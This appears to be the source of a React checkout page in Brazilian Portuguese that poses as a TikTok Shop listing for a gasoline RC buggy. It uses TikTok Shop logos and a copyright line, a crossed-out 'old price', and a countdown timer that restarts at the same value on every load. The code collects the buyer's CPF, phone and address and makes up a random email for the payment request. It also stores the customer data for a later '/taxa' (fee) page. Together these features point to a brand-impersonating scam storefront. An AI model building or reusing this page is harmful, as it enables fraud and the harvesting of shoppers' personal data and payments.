import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { getDeliveryDateRange } from '@/utils/deliveryDate';

export default function CheckoutPage() {
  const [location, setLocation] = useLocation();
  const params = new URLSearchParams(window.location.search);
  const couponApplied = params.get('cupom') === 'true';

  // Cálculos de preço
  const productPrice = 139.90;
  const shippingPrice = 9.90;
  const discount = couponApplied ? productPrice * 0.10 : 0;
  const finalProductPrice = productPrice - discount;
  const total = finalProductPrice + shippingPrice;
  const oldPrice = 279.90;
  const savings = oldPrice - total;
  const deliveryRange = getDeliveryDateRange();

  const [address, setAddress] = useState({
    cep: '',
    rua: '',
    numero: '',
    cidade: '',
    estado: ''
  });

  const [fiscalData, setFiscalData] = useState({
    nome: '',
    telefone: '',
    cpf: ''
  });

  const [isLoadingCep, setIsLoadingCep] = useState(false);
  const [isProcessingPayment, setIsProcessingPayment] = useState(false);

  // Timer de contagem regressiva
  const [timeLeft, setTimeLeft] = useState(6 * 3600 + 46 * 60 + 32);
  const timerRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    // Scroll to top quando a página carregar
    window.scrollTo({ top: 0, behavior: 'instant' });

    setTimeLeft(6 * 3600 + 46 * 60 + 32);
    
    if (timerRef.current) {
      clearInterval(timerRef.current);
    }
    
    timerRef.current = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 0) {
          if (timerRef.current) {
            clearInterval(timerRef.current);
            timerRef.current = null;
          }
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => {
      if (timerRef.current) {
        clearInterval(timerRef.current);
        timerRef.current = null;
      }
    };
  }, []);

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  };

  const formatCep = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length <= 5) {
      return numbers;
    }
    return `${numbers.slice(0, 5)}-${numbers.slice(5, 8)}`;
  };

  const handleCepChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCep(e.target.value);
    setAddress({ ...address, cep: formatted });

    const numbers = formatted.replace(/\D/g, '');
    if (numbers.length === 8) {
      setIsLoadingCep(true);
      try {
        const response = await fetch(`https://viacep.com.br/ws/${numbers}/json/`);
        const data = await response.json();
        
        if (!data.erro) {
          setAddress({
            ...address,
            cep: formatted,
            rua: data.logradouro || '',
            cidade: data.localidade || '',
            estado: data.uf || ''
          });
        }
      } catch (error) {
        console.error('Erro ao buscar CEP:', error);
      } finally {
        setIsLoadingCep(false);
      }
    }
  };

  const formatTelefone = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length <= 10) {
      return numbers.replace(/(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
    }
    return numbers.replace(/(\d{2})(\d{5})(\d{0,4})/, '($1) $2-$3');
  };

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, '$1.$2.$3-$4');
  };

  const generateRandomEmail = (name: string) => {
    const randomNum = Math.floor(Math.random() * 10000);
    const cleanName = name
      .toLowerCase()
      .normalize('NFD')
      .replace(/[\u0300-\u036f]/g, '')
      .replace(/[^a-z0-9]/g, '');
    return `${cleanName}${randomNum}@cliente.com`;
  };

  const handleFazerPedido = async () => {
    // Valida se todos os campos estão preenchidos
    if (!fiscalData.nome || !fiscalData.telefone || !fiscalData.cpf) {
      alert('Por favor, preencha todos os dados pessoais.');
      return;
    }

    if (!address.cep || !address.rua || !address.numero || !address.cidade || !address.estado) {
      alert('Por favor, preencha todos os dados de endereço.');
      return;
    }

    setIsProcessingPayment(true);

    try {
      const randomEmail = generateRandomEmail(fiscalData.nome);

      const paymentData = {
        amount: total.toFixed(2),
        customer_name: fiscalData.nome,
        customer_email: randomEmail,
        customer_cpf: fiscalData.cpf.replace(/\D/g, ''),
        customer_phone: fiscalData.telefone.replace(/\D/g, ''),
        description: 'Buggy Controle remoto a Gasolina Com Bolsa Off Road 29cc'
      };

      const response = await fetch('/api/payments', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(paymentData)
      });

      const responseData = await response.json();

      if (!response.ok) {
        throw new Error(responseData.error?.message || 'Erro ao criar pagamento');
      }

      const transaction = responseData.data || responseData;
      
      // Salva dados corretos no sessionStorage para evitar bug da API
      sessionStorage.setItem('paymentData', JSON.stringify({
        ...transaction,
        amount: total.toFixed(2),
        correctAmount: total.toFixed(2)
      }));
      
      // Salva dados do cliente no localStorage para reutilizar na página /taxa
      localStorage.setItem('customerData', JSON.stringify({
        nome: fiscalData.nome,
        cpf: fiscalData.cpf.replace(/\D/g, ''),
        email: randomEmail,
        telefone: fiscalData.telefone.replace(/\D/g, '')
      }));
      
      // Salva endereço do cliente no localStorage para página de acompanhamento
      localStorage.setItem('customerAddress', JSON.stringify({
        cep: address.cep,
        rua: address.rua,
        numero: address.numero,
        cidade: address.cidade,
        estado: address.estado
      }));
      
      window.location.href = `/pagamento?id=${transaction.transaction_id}`;

    } catch (error: any) {
      console.error('Erro ao processar pagamento:', error);
      alert(`Erro ao processar pagamento: ${error.message || 'Tente novamente.'}`);
      setIsProcessingPayment(false);
    }
  };

  return (
    <div className="bg-white text-black min-h-screen" style={{ maxWidth: '428px', margin: '0 auto' }}>
      {/* Logo TikTok Shop */}
      <div className="bg-white px-4 pt-6 pb-4 border-b border-gray-200">
        <img 
          src="https://freepnglogo.com/images/all_img/1714299248tiktok-shop-logo-png-transparent.png"
          alt="TikTok Shop"
          className="h-12 mx-auto object-contain"
        />
      </div>

      {/* Timer de oferta */}
      <div className="bg-[#FDE5EA] px-4 py-2 flex items-center justify-between">
        <span className="text-xs font-normal text-[#F52B56]">
          🔥 Oferta termina em:
        </span>
        <span className="text-sm font-semibold text-[#F52B56]">
          {formatTime(timeLeft)}
        </span>
      </div>

      {/* Produto */}
      <div className="px-4 py-3 border-b border-gray-200">
        <div className="flex items-start">
          <img 
            src="https://ae-pic-a1.aliexpress-media.com/kf/S964945ee819e41c68c769ba1eccbc8981.jpg_640x640q75.jpg_.avif"
            alt="Buggy controle remoto a gasolina"
            className="w-24 h-24 object-contain mr-3"
          />
          <div className="flex-1">
            <h3 className="text-sm font-normal mb-1">
              Buggy Controle remoto a Gasolina Com Bolsa Off Road 29cc
            </h3>
            <p className="text-xs text-gray-500 mb-2 font-normal">VERMELHO</p>
            <div className="flex items-baseline">
              <span className="text-lg font-semibold text-[#F52B56] mr-2">
                R$ {finalProductPrice.toFixed(2).replace('.', ',')}
              </span>
              <span className="text-xs text-gray-400 line-through mr-1 font-normal">R$ {oldPrice.toFixed(2).replace('.', ',')}</span>
              <span className="text-xs text-[#F52B56] font-normal">
                -{Math.round((1 - finalProductPrice/oldPrice) * 100)}%
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Entrega */}
      <div className="px-4 py-3 border-b border-gray-200">
        <div className="flex items-center justify-between mb-1">
          <span className="text-sm font-normal">Receba até {deliveryRange}</span>
          <span className="text-sm font-normal">R$ 9,90</span>
        </div>
        <span className="text-xs text-gray-500 font-normal">Envio padrão</span>
      </div>

      {/* Desconto */}
      {couponApplied && (
        <div className="px-4 py-3 border-b border-gray-200 bg-[#FFF9E6]">
          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <i className="fas fa-ticket-alt text-[#F52B56] mr-2"></i>
              <span className="text-sm font-normal">Desconto de 10%</span>
            </div>
            <span className="text-sm text-[#F52B56] font-normal">- R$ {discount.toFixed(2).replace('.', ',')}</span>
          </div>
        </div>
      )}

      {/* Formulário */}
      <div className="px-4 py-4">
        {/* Dados Pessoais */}
        <div className="mb-4">
          <h3 className="text-base font-semibold mb-3">Dados pessoais para nota fiscal</h3>
          
          <div className="mb-3">
            <label className="block text-sm font-normal mb-1">Nome completo</label>
            <input 
              type="text"
              value={fiscalData.nome}
              onChange={(e) => setFiscalData({ ...fiscalData, nome: e.target.value })}
              placeholder="Digite seu nome completo"
              className="w-full border border-gray-300 rounded px-3 py-2.5 text-base focus:outline-none focus:border-[#F52B56] focus:ring-1 focus:ring-[#F52B56]"
              style={{ fontSize: '16px' }}
            />
          </div>

          <div className="mb-3">
            <label className="block text-sm font-normal mb-1">CPF</label>
            <input 
              type="tel"
              inputMode="numeric"
              value={fiscalData.cpf}
              onChange={(e) => setFiscalData({ ...fiscalData, cpf: formatCPF(e.target.value) })}
              placeholder="000.000.000-00"
              maxLength={14}
              className="w-full border border-gray-300 rounded px-3 py-2.5 text-base focus:outline-none focus:border-[#F52B56] focus:ring-1 focus:ring-[#F52B56]"
              style={{ fontSize: '16px' }}
            />
          </div>

          <div className="mb-3">
            <label className="block text-sm font-normal mb-1">Telefone</label>
            <input 
              type="tel"
              inputMode="tel"
              value={fiscalData.telefone}
              onChange={(e) => setFiscalData({ ...fiscalData, telefone: formatTelefone(e.target.value) })}
              placeholder="(00) 00000-0000"
              maxLength={15}
              className="w-full border border-gray-300 rounded px-3 py-2.5 text-base focus:outline-none focus:border-[#F52B56] focus:ring-1 focus:ring-[#F52B56]"
              style={{ fontSize: '16px' }}
            />
          </div>
        </div>

        {/* Endereço de Entrega */}
        <div className="mb-4">
          <h3 className="text-base font-semibold mb-3">Endereço de entrega</h3>
          
          <div className="grid grid-cols-2 gap-3 mb-3">
            <div>
              <label className="block text-sm font-normal mb-1">CEP</label>
              <input 
                type="tel"
                inputMode="numeric"
                value={address.cep}
                onChange={handleCepChange}
                placeholder="00000-000"
                maxLength={9}
                className="w-full border border-gray-300 rounded px-3 py-2.5 text-base focus:outline-none focus:border-[#F52B56] focus:ring-1 focus:ring-[#F52B56]"
                style={{ fontSize: '16px' }}
              />
            </div>
            <div>
              <label className="block text-sm font-normal mb-1">Cidade</label>
              <input 
                type="text"
                value={address.cidade}
                onChange={(e) => setAddress({ ...address, cidade: e.target.value })}
                placeholder=""
                className="w-full border border-gray-300 rounded px-3 py-2.5 text-base focus:outline-none focus:border-[#F52B56] focus:ring-1 focus:ring-[#F52B56]"
                style={{ fontSize: '16px' }}
              />
            </div>
          </div>

          <div className="mb-3">
            <label className="block text-sm font-normal mb-1">Rua</label>
            <input 
              type="text"
              value={address.rua}
              onChange={(e) => setAddress({ ...address, rua: e.target.value })}
              placeholder=""
              className="w-full border border-gray-300 rounded px-3 py-2.5 text-base focus:outline-none focus:border-[#F52B56] focus:ring-1 focus:ring-[#F52B56]"
              style={{ fontSize: '16px' }}
            />
          </div>

          <div className="grid grid-cols-2 gap-3 mb-3">
            <div>
              <label className="block text-sm font-normal mb-1">Número</label>
              <input 
                type="text"
                value={address.numero}
                onChange={(e) => setAddress({ ...address, numero: e.target.value })}
                placeholder=""
                className="w-full border border-gray-300 rounded px-3 py-2.5 text-base focus:outline-none focus:border-[#F52B56] focus:ring-1 focus:ring-[#F52B56]"
                style={{ fontSize: '16px' }}
              />
            </div>
            <div>
              <label className="block text-sm font-normal mb-1">UF</label>
              <input 
                type="text"
                value={address.estado}
                onChange={(e) => setAddress({ ...address, estado: e.target.value.toUpperCase() })}
                placeholder="SP"
                maxLength={2}
                className="w-full border border-gray-300 rounded px-3 py-2.5 text-base uppercase focus:outline-none focus:border-[#F52B56] focus:ring-1 focus:ring-[#F52B56]"
                style={{ fontSize: '16px' }}
              />
            </div>
          </div>
        </div>
      </div>

      {/* Resumo e Botão */}
      <div className="px-4 py-4 border-t-8 border-gray-100">
        <div className="mb-4">
          <div className="flex justify-between mb-2">
            <span className="text-sm text-gray-600">Produto</span>
            <span className="text-sm font-medium">R$ {finalProductPrice.toFixed(2).replace('.', ',')}</span>
          </div>
          <div className="flex justify-between mb-2">
            <span className="text-sm text-gray-600">Frete</span>
            <span className="text-sm font-medium">R$ 9,90</span>
          </div>
          {couponApplied && (
            <div className="flex justify-between mb-2">
              <span className="text-sm text-[#F52B56]">Desconto</span>
              <span className="text-sm text-[#F52B56] font-medium">- R$ {discount.toFixed(2).replace('.', ',')}</span>
            </div>
          )}
          <div className="flex justify-between pt-2 border-t border-gray-200">
            <span className="text-base font-semibold">Total</span>
            <span className="text-lg font-semibold text-[#F52B56]">R$ {total.toFixed(2).replace('.', ',')}</span>
          </div>
          <div className="text-right mt-1">
            <span className="text-xs text-gray-500">Você economiza R$ {savings.toFixed(2).replace('.', ',')}</span>
          </div>
        </div>

        <button
          onClick={handleFazerPedido}
          disabled={isProcessingPayment}
          className="w-full bg-[#F52B56] text-white font-semibold text-base rounded-lg py-3.5 shadow-sm disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {isProcessingPayment ? 'Processando...' : 'Fazer pedido'}
        </button>
      </div>

      {/* Rodapé TikTok Shop */}
      <div className="bg-black px-4 py-6 text-white">
        <div className="flex items-center justify-center mb-3">
          <img 
            src="https://freepnglogo.com/images/all_img/1714299248tiktok-shop-logo-png-transparent.png"
            alt="TikTok Shop"
            className="h-6 object-contain brightness-0 invert"
          />
        </div>
        <div className="text-center text-gray-500 font-normal leading-tight">
          <p className="mb-0.5" style={{ fontSize: '12px' }}>© 2025 TikTok Shop. Todos os direitos reservados.</p>
          <p style={{ fontSize: '12px' }}>Compra segura e protegida</p>
        </div>
      </div>
    </div>
  );
}
